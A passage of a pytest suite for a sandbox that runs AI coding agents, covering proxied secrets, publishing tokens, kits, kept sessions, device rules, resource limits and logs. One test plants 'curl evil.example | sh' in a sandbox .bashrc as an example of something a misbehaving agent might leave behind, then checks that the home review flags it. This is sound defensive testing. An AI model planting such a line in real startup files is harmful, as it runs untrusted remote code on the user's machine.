    run = m.run("--git-token-secret", "https://github.com=gh", "--secret-env", "API_KEY=api")
    assert run.env["GH_TOKEN"] == TOKEN and run.env["API_KEY"] == "s3cr3t-value"
    assert "API_KEY" in run.config["secret_names"] and "s3cr3t-value" not in run.err
    assert m.plan("--git-token-secret", "https://github.com=gh")["git_credentials"][0]["secret"] == "gh"
    proxied = m.run("--git-token-secret", "https://github.com=gh", "--token-proxy")
    assert "GH_TOKEN" not in proxied.env and proxied.proxy["git_tokens"][0]["token"] == TOKEN
    m.refused("--git-token-secret", "https://github.com=missing", match="no secret missing")
    m.refused("--secret-env", "HOME", match="Sandbox-owned variable")


@git
def api_keys_stay_out_of_the_sandbox(m):
    """--api-key: the agent sees a placeholder, the proxy's own config holds the key, the host is opened."""
    store = {"DEVTO_API_KEY": "devto-s3cr3t-value", "medium": "medium-s3cr3t-value"}
    m.monkeypatch.setattr(s, "load_secret_store_module", lambda: types.SimpleNamespace(get=store.get))
    run = m.run("--api-key", "dev.to=DEVTO_API_KEY", "--api-key", "api.medium.com=MEDIUM_TOKEN=medium")
    assert run.env["DEVTO_API_KEY"] == "sandbox-ai-api-key-placeholder-DEVTO_API_KEY"
    assert run.env["MEDIUM_TOKEN"] == "sandbox-ai-api-key-placeholder-MEDIUM_TOKEN"
    assert "devto-s3cr3t-value" not in json.dumps(run.env) and "devto-s3cr3t-value" not in run.err
    assert [(e["host"], e["key"]) for e in run.proxy["api_keys"]] == [("dev.to", "devto-s3cr3t-value"),
                                                                      ("api.medium.com", "medium-s3cr3t-value")]
    plan = m.plan("--api-key", "dev.to=DEVTO_API_KEY")
    assert "dev.to" in plan["https_hosts"]
    assert plan["api_keys"] == [{"host": "dev.to", "variable": "DEVTO_API_KEY", "secret": "DEVTO_API_KEY"}]
    assert "devto-s3cr3t-value" not in json.dumps(plan)
    m.refused("--api-key", "dev.to=MISSING", match="no secret MISSING")
    m.refused("--api-key", "192.0.2.1=DEVTO_API_KEY", match="--api-key expects")
    m.refused("--api-key", "dev.to=DEVTO_API_KEY", "--no-inspect", "dev.to", match="drop --no-inspect dev.to")
    m.refused("--api-key", "dev.to=PATH", match="Sandbox-owned variable")


@git
def publish_with_logins_that_stay_out(m):
    """--publish pypi,npm,github: the hosts open, the tools' variables hold placeholders, the proxy holds the tokens,
    npm gets its configuration, and every publishing request is asked (the ruleset "publish")."""
    m.monkeypatch.setattr(s, "_publish_logins_module", None)
    module = s.load_publish_logins_module()
    module.save([{"kind": "pypi", "host": "upload.pypi.org", "secret": "PYPI_TOKEN"},
                 {"kind": "npm", "host": "registry.npmjs.org", "secret": "NPM_SECRET"},
                 {"kind": "github", "host": "api.github.com", "secret": "GH_PUB"}])
    store = {"PYPI_TOKEN": "pypi-s3cr3t-value", "NPM_SECRET": "npm_s3cr3t-value", "GH_PUB": "ghp_s3cr3t-value"}
    m.monkeypatch.setattr(s, "load_secret_store_module", lambda: types.SimpleNamespace(get=store.get))
    run = m.run("--publish", "pypi,npm", "--publish", "github")
    assert run.env["TWINE_PASSWORD"] == run.env["UV_PUBLISH_TOKEN"] == "sandbox-ai-publish-placeholder-pypi"
    assert run.env["GH_TOKEN"] == "sandbox-ai-publish-placeholder-github" and run.env["TWINE_USERNAME"] == "__token__"
    assert run.files["npmrc"] == "//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n"
    assert run.env["NPM_CONFIG_GLOBALCONFIG"] == "/sandbox/session/npmrc"
    assert "s3cr3t" not in json.dumps(run.env) and "s3cr3t" not in run.err
    keys = {(e["host"], e["key"], bool(e.get("basic"))) for e in run.proxy["api_keys"]}
    assert keys == {("upload.pypi.org", "pypi-s3cr3t-value", True), ("registry.npmjs.org", "npm_s3cr3t-value", False),
                    ("api.github.com", "ghp_s3cr3t-value", False), ("uploads.github.com", "ghp_s3cr3t-value", False)}
    plan = m.plan("--publish", "pypi")
    assert "upload.pypi.org" in plan["https_hosts"] and "s3cr3t" not in json.dumps(plan)
    assert plan["publish"] == [{"kind": "pypi", "hosts": ["upload.pypi.org"], "secret": "PYPI_TOKEN",
                                "variables": sorted(module.KINDS["pypi"]["env"])}]
    publish = next(r for r in plan["rulesets"] if r["name"] == "publish")
    assert publish["http"] == ["publish-pypi-1"]
    plain = m.plan()
    assert plain["publish"] == [] and "upload.pypi.org" not in plain["https_hosts"]  # only when the start says so
    m.refused("--publish", "crates", match="--publish crates: no login")
    m.refused("--publish", "docker", match="no kind 'docker'")
    m.refused("--publish", "pypi", "--no-inspect", "upload.pypi.org", match="drop --no-inspect upload.pypi.org")
    store.pop("NPM_SECRET")
    m.refused("--publish", "npm", match="no secret NPM_SECRET")


@git
def model_and_effort_in_the_agents_own_words(m):
    """--model and --effort: the agent's own arguments (Claude --effort, Codex model_reasoning_effort), in the
    plan, refused where the agent has no such level."""
    run = m.run("--model", "opus" if m.agent == "claude" else "gpt-5-codex" if m.agent == "codex" else "ollama/qwen3")
    command = run.config["command"]
    assert command[command.index("--model") + 1] in ("opus", "gpt-5-codex", "ollama/qwen3")
    if m.agent == "opencode":
        m.refused("--effort", "high", match="sets its effort per model")
        return
    run = m.run("--effort", "high")
    command = run.config["command"]
    tail = command[command.index("high") - 1:][:2] if m.agent == "claude" else \
        command[command.index("model_reasoning_effort=high") - 1:][:2]
    assert tail == (["--effort", "high"] if m.agent == "claude" else ["-c", "model_reasoning_effort=high"])
    plan = m.plan("--model", "x1", "--effort", "medium")
    assert plan["model"] == "x1" and plan["effort"] == "medium"
    m.refused("--effort", "turbo", match=f"--effort for {m.agent} is one of")


# --- kits, plugins, memory ------------------------------------------------------------------------------

KITS, kits = scenarios()


@kits
def default_kit_and_builtin_skill(m):
    plan = m.plan()
    assert plan["kits"]["sources"][0]["kit"] == "built-in" and "sandbox-ai" in plan["kits"]["entries"]["skills"]
    run = m.run()
    skills = run.kit_entries["/root/" + s.load_kits_module().LAYOUT[m.agent]["skills"]]
    assert skills == ["sandbox-ai", "sandbox-example"]
    assert all(mode == "ro" for _, _, mode in run.kit_mounts)
    assert ("/sandbox/marketplace" in [dest for _, dest, _ in run.kit_mounts]) == (m.agent == "claude")
    assert "created the default kit" in run.err


@kits
def no_default_kit(m):
    plan = m.plan("--no-default-kit")
    assert plan["kits"]["sources"] == [] and plan["kits"]["entries"] == {}
    run = m.run("--no-default-kit", "--no-memory")
    assert [dest for _, dest, _ in run.kit_mounts] == (["/sandbox/marketplace"] if m.agent == "claude" else [])


@kits
def builtin_kit_egm(m):
    if m.agent != "claude":
        m.refused("--kit", "egm", match=f"built-in kit egm is not available for {m.agent} \\(only for claude\\)")
        return
    plan = m.plan("--kit", "egm")
    assert plan["kits"]["sources"][-1]["kit"] == "kit egm"
    assert plan["kits"]["plugins"]["missing"] == ["egm@sandbox-ai"]
    run = m.run("--kit", "egm")
    assert "egm@sandbox-ai; install them with: sandbox-ai plugins claude --kit egm" in run.err
    # The run created the default kit, which enables sandcastle; without it only egm is declared.
    assert m.plan("--kit", "egm")["kits"]["plugins"]["missing"] == ["sandcastle@sandbox-ai", "egm@sandbox-ai"]
    assert m.plan("--kit", "egm", "--no-default-kit")["kits"]["plugins"]["missing"] == ["egm@sandbox-ai"]


@kits
def no_plugins(m):
    plan = m.plan("--no-plugins")
    assert "plugins" not in plan["kits"]
    run = m.run("--no-plugins")
    if m.agent == "claude":
        settings = run.home / ".claude/settings.json"
        assert not settings.exists() or "enabledPlugins" not in json.loads(settings.read_text())
        assert not any(dest.startswith("/root/.claude/plugins") for _, dest, _ in run.kit_mounts)
    # A kit whose only content is a plugin then brings nothing, without an error.
    if m.agent == "claude":
        assert "plugins" not in m.plan("--no-plugins", "--kit", "egm")["kits"]


@kits
def opencode_npm_plugins(m):
    kit = Path(os.environ["HOME"]) / ".local/share/sandbox-ai/kits/npm" / m.agent
    kit.mkdir(parents=True)
    (kit / "marketplaces.json").write_text(json.dumps({"plugins": ["opencode-demo@1.0.0"]}))
    run = m.run("--kit", "npm")
    if m.agent == "opencode":
        assert json.loads(run.env["OPENCODE_CONFIG_CONTENT"])["plugin"] == ["opencode-demo@1.0.0"]
        assert "--allow-host registry.npmjs.org" in run.err
        assert set(json.loads((m.run("--kit", "npm", "--no-plugins").env).get("OPENCODE_CONFIG_CONTENT", "{}"))) <= set(s.OPENCODE_TELEMETRY_CONFIG)  # only --telemetry off's settings
    elif m.agent == "codex":
        assert "not supported for Codex yet" in run.err
    else:
        # For Claude it reads as NAME@MARKETPLACE, of a marketplace nobody declares: skipped, said so.
        assert "plugin opencode-demo@1.0.0 skipped: no kit declares marketplace 1.0.0" in run.err


@kits
def memory_on_and_off(m):
    plan = m.plan()
    assert plan["kits"]["memory"].startswith(str(Path(os.environ["HOME"]) / ".local/state/sandbox-ai/memory/work-"))
    assert m.plan("--no-memory")["kits"]["memory"] is None
    memory_file = s.load_kits_module().MEMORY_FILE[m.agent][1]
    assert memory_file in m.run().home_files
    assert memory_file not in m.run("--no-memory", "--no-default-kit").home_files


@kits
def copy_into_a_kit_path_is_refused(m):
    source = m.private_file("note.md", "x")
    target = s.load_kits_module().LAYOUT[m.agent]["skills"] + "/mine/SKILL.md"
    m.refused("--copy", f"{source}:{target}", match="sandbox-ai fills .* from the kits")
    run = m.run("--copy", f"{source}:{target}", "--no-default-kit", "--no-memory")
    assert target in run.home_files


@kits
def kit_dir_and_unknown_kit(m):
    mine = m.tmp / "mine"
    (mine / m.agent / "skills/review").mkdir(parents=True)
    (mine / m.agent / "skills/review/SKILL.md").write_text("---\nname: review\n---\n")
    plan = m.plan("--kit-dir", str(mine))
    assert "review" in plan["kits"]["entries"]["skills"]
    m.refused("--kit", "nope", match="--kit nope: .* does not exist")
    m.refused("--kit-dir", str(m.work), match="has no .* directory")
    # A kit inside the workspace could be changed by the agent.
    (m.work / m.agent / "skills").mkdir(parents=True)
    m.refused("--kit-dir", str(m.work), match="Kit .*kit-dir")


# --- --state-dir and sessions ------------------------------------------------------------------------------

STATE, state = scenarios()


@state
def state_dir_keeps_the_home(m):
    home = m.tmp / "state"
    first = m.run("--state-dir", str(home))
    assert first.home == home and stat.S_IMODE(home.stat().st_mode) == 0o700
    (home / "kept.txt").write_text("from run 1")
    second = m.run("--state-dir", str(home))
    assert "kept.txt" in second.home_files and m.mount(home, "/root") in second.joined


@state
def state_dir_refusals(m):
    m.refused("--state-dir", str(m.work / "home"), match="--state-dir")
    m.refused("--session", "web", "--state-dir", str(m.tmp / "s"), match="--session manages its own state")
    link = m.tmp / "link"
    (m.tmp / "real").mkdir(mode=0o700)
    link.symlink_to(m.tmp / "real")
    m.refused("--state-dir", str(link), match="symlink")


@state
def sessions(m):
    assert m.plan("--session", "web")["session"] == "web"
    m.refused("--session", "a/b", match="--session NAME")
    m.refused("--session", "web", "--probe", match="--session manages its own state")


# --- every start: names, history ------------------------------------------------------------------------------

STARTS, starts_case = scenarios()


def history(name):
    return [(e["event"], e.get("status")) for e in s.load_starts_module().history(name)]


@starts_case
def automatic_name(m):
    plan = m.plan()
    assert re.fullmatch(rf"{m.agent}-work-[0-9a-f]{{4}}", plan["name"]) and plan["project_name"] == "work"
    run = m.run()
    name = run.run_record["name"]
    assert re.fullmatch(rf"{m.agent}-work-[0-9a-f]{{4}}", name) and run.config["sandbox"]["name"] == name
    assert run.run_record["kind"] == "agent" and run.run_record["start"] == name  # kept: its own directory
    assert run.run_record["pod"] == (f"agent-{run.a.run_id}" if m.backend == "podman" else None)
    assert history(name) == [("start", None), ("exit", 0)]
    assert m.run().run_record["name"] != name  # every start its own


@starts_case
def chosen_name_and_clash(m):
    run = m.run("--name", "review")
    assert run.run_record["name"] == "review" and history("review")[-1] == ("exit", 0)
    # While a sandbox of that name runs, another start may not take it.
    other = s.runs_dir() / "claude-0000aaaa"
    other.mkdir(parents=True)
    (other / "run.json").write_text(json.dumps({"run": "claude-0000aaaa", "name": "review", "pid": os.getpid()}))
    m.refused("--name", "review", match="The name review is in use")
    m.refused("--name", "claude-0000aaaa", match="is in use")  # nor its run id
    m.refused("--name", "bad name", match="--name NAME: 1-40")
    m.refused("--name", "x", "--session", "y", match="names the start already")
    assert m.plan("--name", "review")["name"] == "review"  # a plan reserves nothing


def sessions_root():
    return CACHED["sessions"].root()


@starts_case
def kept_by_default(m):
    """A task keeps its HOME, options and logs in its start directory; it can be brought back later."""
    run = m.run(agent_args=TASKS[m.agent])
    key = run.run_record["start"]
    directory = sessions_root() / key
    assert run.home == directory / "home" and run.a.state_dir == directory / "home"
    assert stat.S_IMODE(directory.stat().st_mode) == stat.S_IMODE(run.home.stat().st_mode) == 0o700
    data = json.loads((directory / "session.json").read_text())
    assert data["mode"] == "foreground" and data["keep"] is True and data["agent_args"] == TASKS[m.agent]
    assert data["run"] == run.a.run_id and data["name"] == run.run_record["name"]
    assert json.loads((directory / "exit.json").read_text())["status"] == 0
    assert f"{key} keeps its HOME; continue it with: sandbox-ai resume {key}" in m.capsys.readouterr().err + run.err
    entry = next(e for e in s.load_starts_module().entries() if e["id"] == key)
    assert (entry["state"], entry["kind"], entry["home"], entry["status"]) == ("stopped", "run", "kept", 0)
    plan = m.plan()
    assert plan["keep"] is True


@starts_case
def no_keep_and_the_project_file(m):
    run = m.run("--no-keep")
    assert run.run_record["start"] is None and str(sessions_root()) not in str(run.home)
    assert not sessions_root().exists() or not any(sessions_root().iterdir())
    m.project_file({"keep": False})
    assert m.plan()["keep"] is False and m.run().run_record["start"] is None
    assert m.plan("--keep")["keep"] is True  # the command line wins
    m.project_file({"keep": "yes"})
    m.refused(match="keep is true or false")
    m.project_file({})
    # A HOME of your own stays anyway: no second one.
    own = m.tmp / "own"
    run = m.run("--state-dir", str(own), "--keep")
    assert run.home == own and run.run_record["start"] is None and run.run_record["own_home"] is True
    assert "--keep has no effect with --state-dir" in run.err
    assert m.plan("--probe")["keep"] is False


@starts_case
def policy_forbids_kept_homes(m):
    m.policy(forbid_keep=True)
    run = m.run()
    assert run.run_record["start"] is None and str(sessions_root()) not in str(run.home)
    run = m.run("--keep")
    assert run.run_record["start"] is None and "forbid_keep); --keep is ignored" in run.err
    m.refused("--session", "web", match="--session keeps the sandbox HOME, which the administrator's policy forbids")
    assert m.plan()["keep"] is False
    m.policy(forbid=["--keep"])  # the generic way works too
    m.refused("--keep", match="--keep is not allowed by the administrator's policy")


@starts_case
def rebirth_and_the_home_review(m):
    """A kept task comes back as a session: same HOME and options, a new run id, the agent continuing its last
    conversation; what changed in the HOME's start files since its start is named first."""
    run = m.run(agent_args=TASKS[m.agent])
    key = run.run_record["start"]
    directory = sessions_root() / key
    manifest = json.loads((directory / "home-manifest.json").read_text())
    assert manifest["run"] == run.a.run_id and manifest["complete"]
    (run.home / ".bashrc").write_text("curl evil.example | sh\n")  # what an agent might leave behind
    sessions, launched = CACHED["sessions"], []
    m.monkeypatch.setattr(sessions, "launch", lambda name, data, args, a=None, event="rebirth":
                          launched.append((name, args, dict(data))) or 0)
    m.capsys.readouterr()
    assert sessions.resume(key) == 0
    err = m.capsys.readouterr().err
    assert f"the HOME of {key} changed since its last start" in err and re.search(r"added +\.bashrc", err)
    name, args, data = launched[-1]
    assert name == key and args == sessions.CONTINUE_ARGS[m.agent]  # the task is not repeated
    assert data["options"] == ["--backend", m.backend, "--workspace", str(m.work), "--no-tmux"]
    lines = []
    assert sessions.review(key, as_json=True, out=lines.append) == 0  # sandbox-ai resume NAME --review-home --json
    change = json.loads("\n".join(lines))["review"]["changes"][0]
    assert change["path"] == ".bashrc" and "+curl evil.example | sh" in change["diff"]
    # The administrator's policy against kept HOMEs: no rebirth.
    m.monkeypatch.setattr(sessions.launcher(), "load_policy", lambda path=None: {"version": 1, "forbid_keep": True})
    with pytest.raises(ValueError, match="forbids using one"):
        sessions.resume(key)


@starts_case
def project_name(m):
    assert m.plan("--project-name", "shop")["name"].startswith(f"{m.agent}-shop-")
    m.project_file({"name": "store"})
    assert m.plan()["project_name"] == "store" and m.plan()["name"].startswith(f"{m.agent}-store-")
    assert m.plan("--project-name", "cli")["project_name"] == "cli"  # the command line wins
    m.project_file({"options": ["--name", "fixed"]})
    m.refused(match="option --name is not allowed in a project configuration")


TASKS = {"claude": ["-p", "task"], "codex": ["exec", "task"], "opencode": ["run", "task"]}


def in_a_terminal(m):
    """Starts from a terminal, without the matrix's --no-tmux; sessions.start recorded instead of run."""
    started = []
    m.monkeypatch.setattr(CACHED["sessions"], "start", lambda a, argv: started.append((a, argv)) or 0)
    m.monkeypatch.setattr(s.sys.stdin, "isatty", lambda: True)
    m.monkeypatch.setattr(s.sys.stdout, "isatty", lambda: True)
    m.monkeypatch.setattr(m, "argv", lambda *options, agent_args=(): [
        m.agent, "--backend", m.backend, "--workspace", str(m.work), *options,
        *(["--", *agent_args] if agent_args else [])])
    return started


@starts_case
def interactive_starts_detach(m):
    """In a terminal the agent's own interface runs as a detachable session: a supervisor in the background,
    this terminal attached (closing it detaches)."""
    started = in_a_terminal(m)
    assert s.main(m.argv()) == 0
    a, argv = started[-1]
    assert a.tmux is True and s.detachable(a) and re.fullmatch(rf"{m.agent}-work-[0-9a-f]{{4}}", a.start_name)
    assert argv == m.argv()
    assert s.main(m.argv("--name", "web", agent_args=["--model", "x"])) == 0  # options for the agent: still its interface
    assert started[-1][0].start_name == "web"
    assert m.plan()["detachable"] is True


@starts_case
def tasks_stay_in_the_foreground(m):
    """A task (-p, exec, run), --no-tmux and a start without a terminal run here and are only tracked."""
    started = in_a_terminal(m)
    run = m.run(agent_args=TASKS[m.agent])
    assert run.config["tmux"] is False and started == []
    assert history(run.run_record["name"])[-1] == ("exit", 0)
    assert m.run("--no-tmux").config["tmux"] is False and started == []
    m.monkeypatch.setattr(s.sys.stdin, "isatty", lambda: False)
    assert m.run().config["tmux"] is False and started == []
    m.refused("--tmux", match="--tmux needs an interactive terminal")
    assert m.plan()["detachable"] is False


# --- devices and GPUs ---------------------------------------------------------------------------------------

DEVICES, devices = scenarios()


@pytest.fixture
def fake_dev(m):
    """/dev of regular files presented as devices: sda* as block devices, the rest as character devices."""
    dev = m.tmp / "dev"
    for name in ("ttyACM0", "kvm", "kfd", "console", "sda", "nvidia0", "nvidiactl", "nvidia-uvm",
                 "dri/renderD128", "video0"):
        (dev / name).parent.mkdir(parents=True, exist_ok=True)
        (dev / name).write_text("")
        (dev / name).chmod(0o666)
    real_mode = s.device_mode

    def mode(path):
        path = Path(path)
        if path.is_dir():
            return stat.S_IFDIR | 0o755
        if path.name.startswith("sda"):
            return stat.S_IFBLK | 0o660
        return stat.S_IFCHR | 0o666 if dev in path.parents else real_mode(path)
    m.monkeypatch.setattr(s, "DEV", dev)
    m.monkeypatch.setattr(s, "device_mode", mode)
    m.monkeypatch.setattr(s, "CDI_DIRS", (m.tmp / "cdi",))
    return dev


@devices
def device_node(m, dev):
    plan = m.plan("--device", str(dev / "ttyACM0"), "--device", str(dev / "video0"))
    assert plan["devices"] == [{"path": str(dev / "ttyACM0"), "kind": "node"},
                               {"path": str(dev / "video0"), "kind": "node"}]
    run = m.run("--device", str(dev / "ttyACM0"), "--device", str(dev / "video0"))
    assert (f"--device {dev / 'ttyACM0'}" if m.backend == "podman" else f"--dev-bind {dev / 'ttyACM0'}") in run.joined
    assert "is a camera" in run.err


@devices
def refused_devices(m, dev):
    m.refused("--device", str(dev / "console"), match="consoles")
    m.refused("--device", str(dev / "sda"), match="block devices")
    m.refused("--device", "/etc/passwd", match="--device expects")


@devices
def gpu_dri_and_rocm(m, dev):
    assert m.plan("--gpu", "dri")["devices"] == [{"path": str(dev / "dri"), "kind": "dir"}]
    plan = m.plan("--gpu", "rocm", "--device", str(dev / "dri/renderD128"))
    assert plan["devices"] == [{"path": str(dev / "dri"), "kind": "dir"}, {"path": str(dev / "kfd"), "kind": "node"}]
    run = m.run("--gpu", "rocm")
    assert (f"type=bind,src={dev / 'dri'},dst={dev / 'dri'},rw,dev" if m.backend == "podman"
            else f"--dev-bind {dev / 'dri'} {dev / 'dri'}") in run.joined


@devices
def gpu_nvidia(m, dev):
    if m.backend == "podman":
        m.refused("--gpu", "nvidia", match="no CDI specification")
        (m.tmp / "cdi").mkdir()
        (m.tmp / "cdi/nvidia.yaml").write_text("kind: nvidia.com/gpu\n")
        assert m.plan("--gpu", "nvidia")["devices"] == [{"path": "nvidia.com/gpu=all", "kind": "cdi"}]
        assert "--device nvidia.com/gpu=all" in m.run("--gpu", "nvidia").joined
    else:
        assert [d["path"] for d in m.plan("--gpu", "nvidia")["devices"]] == [
            str(dev / n) for n in ("nvidia-uvm", "nvidia0", "nvidiactl")]
        (dev / "nvidia0").unlink()
        m.refused("--gpu", "nvidia", match="is the NVIDIA driver loaded")


@devices
def remote_podman_gets_no_host_devices(m, dev):
    if m.backend == "bwrap":
        m.refused("--podman-url", "unix:///x/podman.sock", match="apply only to Podman")
        return
    m.refused("--podman-url", "unix:///x/podman.sock", "--device", str(dev / "kvm"), match="name devices of this host")
    m.refused("--podman-url", "unix:///x/podman.sock", "--gpu", "dri", match="name devices of this host")
    assert m.plan("--podman-url", "unix:///x/podman.sock", "--gpu", "nvidia")["devices"][0]["kind"] == "cdi"


def plug_pico(m, dev):
    """A Raspberry Pi Pico on USB in a fake sysfs, its nodes in the fake /dev (see tests/test_devices.py)."""
    from test_devices import FakeUsb
    usb = FakeUsb(m.tmp, m.monkeypatch, devices=s.load_devices_module(), launcher=None, dev=dev)
    usb.plug()
    return usb


def device_rules(m, *rules, defaults=None):
    return str(m.private_file("device-rules.json", json.dumps(
        {"version": 1, **({"defaults": {"devices": defaults}} if defaults else {}), "devices": list(rules)})))


@devices
def device_by_usb_identity(m, dev):
    plug_pico(m, dev)
    nodes = [str(dev / "bus/usb/001/005"), str(dev / "ttyACM0")]
    plan = m.plan("--device", "usb:2e8a:000a:E6609CB2")
    assert plan["devices"] == [{"path": node, "kind": "node"} for node in nodes]
    assert plan["device_grants"][0]["by"] == "identity" and plan["device_grants"][0]["track"] is True
    run = m.run("--device", "usb:2e8a:000a")
    for node in nodes:
        assert (f"--device {node}" if m.backend == "podman" else f"--dev-bind {node} {node}") in run.joined
    assert run.device_grants[0]["device"]["serial"] == "E6609CB2" and run.device_grants[0]["state"] == "attached"
    assert "watch_devices" in m.threads and run.run_record["log_debug"] is False
    m.refused("--device", "usb:2e8a:000a:OTHER", match="no such USB device")
    m.refused("--device", "usb:2e8a", match="usb:VENDOR:PRODUCT")
    # A rule set allowing only this device by its IDs and serial.
    only = device_rules(m, {"id": "pico", "decision": "allow", "usb": "2e8a:000a", "serial": "E6609CB2"},
                        defaults="deny")
    grants = m.plan("--rules", only, "--device", "usb:2e8a:000a")["device_grants"]
    assert grants[0]["rule"] == "pico" and grants[0]["decision"] == "allow"
    m.refused("--rules", only, "--device", str(dev / "kvm"), match="USB IDs of the device .* cannot be read")


@devices
def device_rules_deny_ask_and_allow(m, dev):
    rules = device_rules(m, {"id": "no-cams", "decision": "deny", "node": "/dev/video*", "reason": "no cameras"},
                         {"id": "ask-kvm", "decision": "ask", "node": "/dev/kvm"})
    m.refused("--rules", rules, "--device", str(dev / "video0"), match="no cameras")
    plan = m.plan("--rules", rules, "--device", str(dev / "kvm"), "--device", str(dev / "ttyACM0"))
    assert plan["devices"] == [{"path": str(dev / "ttyACM0"), "kind": "node"}]  # kvm waits for the question
    assert [(g["value"], g["state"], g["rule"]) for g in plan["device_grants"]] == [
        (str(dev / "kvm"), "held", "ask-kvm"), (str(dev / "ttyACM0"), "attached", None)]
    assert plan["rulesets"][0]["devices"] == ["no-cams", "ask-kvm"]
    run = m.run("--rules", rules, "--device", str(dev / "kvm"), "--device", str(dev / "ttyACM0"))
    assert str(dev / "kvm") not in run.joined and str(dev / "ttyACM0") in run.joined
    assert "held for a question" in run.err and {"watch_devices", "watch"} <= set(m.threads)
    held = [g for g in run.device_grants if g["state"] == "held"]
    assert held[0]["pending"] == [str(dev / "kvm")] and held[0]["source"] == "start"
    assert run.device_rules[0]["devices"][0]["id"] == "no-cams"
    m.refused("--rules", rules, "--ask", "off", "--device", str(dev / "kvm"), match="--ask is off")


@devices
def device_rules_of_the_policy_win(m, dev):
    m.policy(rules={"version": 1, "devices": [{"id": "admin-no-tty", "decision": "deny", "node": "/dev/ttyACM*"}]})
    mine = device_rules(m, {"id": "my-tty", "decision": "allow", "node": "/dev/ttyACM*"})
    m.refused("--rules", mine, "--device", str(dev / "ttyACM0"), match="admin-no-tty")
    assert m.plan("--rules", mine, "--device", str(dev / "kvm"))["devices"] == [{"path": str(dev / "kvm"), "kind": "node"}]


@devices
def device_allow_list_refuses_the_gpu_too(m, dev):
    only = device_rules(m, {"id": "pico", "decision": "allow", "usb": "2e8a:000a"}, defaults="deny")
    m.refused("--rules", only, "--gpu", "dri", match="its default is deny")
    m.refused("--rules", only, "--device", str(dev / "kvm"), match="cannot be read")  # not in the fake sysfs


# --- resource limits ----------------------------------------------------------------------------------------

LIMITS, limits = scenarios()


@limits
def default_limits(m):
    assert m.plan()["limits"] == {"memory": "8g", "cpus": "4", "pids": 4096}
    run = m.run()
    if m.backend == "podman":
        assert ["--memory", "8g", "--cpus", "4", "--pids-limit", "4096"] == run.command[
            run.command.index("--memory"):run.command.index("--memory") + 6]
    else:
        prefix = s.limits_prefix(run.a)
        assert "MemoryMax=8G" in prefix and "CPUQuota=400%" in prefix and "TasksMax=4096" in prefix


@limits
def chosen_and_switched_off_limits(m):
    assert m.plan("--memory", "512m", "--cpus", "1.5", "--pids", "64")["limits"] == {
        "memory": "512m", "cpus": "1.5", "pids": 64}
    assert m.plan("--memory", "none", "--cpus", "none", "--pids", "none")["limits"] == {}
    run = m.run("--memory", "none", "--cpus", "none", "--pids", "none")
    assert "--memory" not in run.command and "--pids-limit" not in run.command


@limits
def limits_without_systemd_or_controllers(m):
    m.monkeypatch.setattr(s, "delegated_controllers", lambda path=None: {"pids"})
    plan = m.plan()
    assert plan["limits"] == {"pids": 4096}
    m.monkeypatch.setattr(s, "user_manager_running", lambda: False)
    assert m.plan()["limits"] == {}
    assert "--memory, --cpus and --pids are not enforced" in m.run().err


@limits
def invalid_limits(m):
    m.refused("--memory", "lots", match="--memory expects a size")
    m.refused("--cpus", "99", match="--cpus expects a number from 0.01 to 8")
    m.refused("--pids", "8", match="--pids expects a number of at least 16")


# --- display: GUI, VNC, Wayland, tmux -------------------------------------------------------------------------

DISPLAY, display = scenarios()


@display
def gui(m):
    plan = m.plan("--gui", "--gui-screen", "800x600x16")
    assert plan["gui"] == {"display": s.GUI_DISPLAY, "screen": "800x600x16", "vnc": False}
    run = m.run("--gui")
    assert json.loads(run.files["gui.json"])["screen"] == "1920x1080x24" and run.env["DISPLAY"] == s.GUI_DISPLAY
    if m.backend == "podman":
        assert "--shm-size=1g" in run.create
    assert "gui.json" not in m.run().files and "DISPLAY" not in m.run().env


@display
def audio_virtual(m):
    """--audio virtual: in the plan, a sink inside the sandbox (audio.json, PULSE_SERVER); none without it."""
    assert m.plan("--audio", "virtual")["audio"] == "virtual" and m.plan()["audio"] is None
    run = m.run("--audio", "virtual")
    assert json.loads(run.files["audio.json"]) == {"kind": "virtual"}
    assert run.env["PULSE_SERVER"] == f"unix:{s.RUNTIME.AUDIO_SOCKET}"
    plain = m.run()
    assert "audio.json" not in plain.files and "PULSE_SERVER" not in plain.env


@display
def gui_vnc(m):
    vnc = m.tmp / "vnc"
    plan = m.plan("--gui-vnc", str(vnc))
    assert plan["gui"]["vnc"] is True  # implies --gui
    run = m.run("--gui-vnc", str(vnc))
    assert m.mount(vnc, s.VNC_DIR) in run.joined and stat.S_IMODE(vnc.stat().st_mode) == 0o700
    m.refused("--gui-vnc", str(m.work / "vnc"), match="--gui-vnc must lie outside the workspace")


@display
def gui_wayland(m):
    m.refused("--gui-wayland", match="--gui-wayland requires WAYLAND_DISPLAY")
    m.monkeypatch.setenv("WAYLAND_DISPLAY", "wayland-9")
    m.refused("--gui-wayland", match="Wayland socket not found")
    import socket
    sock = socket.socket(socket.AF_UNIX)
    path = Path(os.environ["XDG_RUNTIME_DIR"]) / "wayland-9"
    sock.bind(str(path))
    try:
        run = m.run("--gui-wayland")
        assert run.env["WAYLAND_DISPLAY"] == "wayland-0" and run.env["XDG_RUNTIME_DIR"] == "/run/user/0"
        assert m.mount(path, s.WAYLAND_TARGET) in run.joined and "--gui-wayland gives the agent access" in run.err
    finally:
        sock.close()


@display
def bad_screen(m):
    for value in ("800x600", "8x600x24", "800x600x12"):
        m.refused("--gui-screen", value, match="--gui-screen expects")


@display
def tmux_choice(m):
    assert m.plan()["tmux"] is False  # --no-tmux from the matrix's command line
    assert m.run().config["tmux"] is False
    a = s.parse_args([m.agent, "--backend", m.backend, "--tmux"])
    assert s.resolve_tmux(a) is True


# --- logs ---------------------------------------------------------------------------------------------------

LOGS, logs = scenarios()


@logs
def log_dir(m):
    logs_dir = m.tmp / "logs"
    plan = m.plan("--log-dir", str(logs_dir))
    assert plan["log_dir"] == str(logs_dir) and plan["proxy"]["log_dir"] == str(logs_dir)
    run = m.run("--log-dir", str(logs_dir))
    assert "add @denied4" in run.firewall and run.files["resolv.conf"] == "nameserver 127.0.0.1\n"
    assert run.config["watch"][:2] == ["/work", "/root"]  # file access is logged with an explicit --log-dir
    assert m.mount(logs_dir, s.LOG_DIR) in run.joined


@logs
def default_log_dir_only_for_the_proxy(m):
    run = m.run()
    assert run.config["watch"] == [] and "add @denied4" in run.firewall  # the default directory logs denials
    run = m.run("--no-proxy")
    assert run.a.log_dir is None and "@denied4" not in run.firewall
    assert run.files["resolv.conf"].startswith("# DNS is pinned")


@logs
def log_dir_refusals(m):
    m.refused("--log-dir", str(m.work / "logs"), match="--log-dir must lie outside the workspace")
    m.refused("--state-dir", str(m.tmp / "state"), "--log-dir", str(m.tmp / "state/logs"),
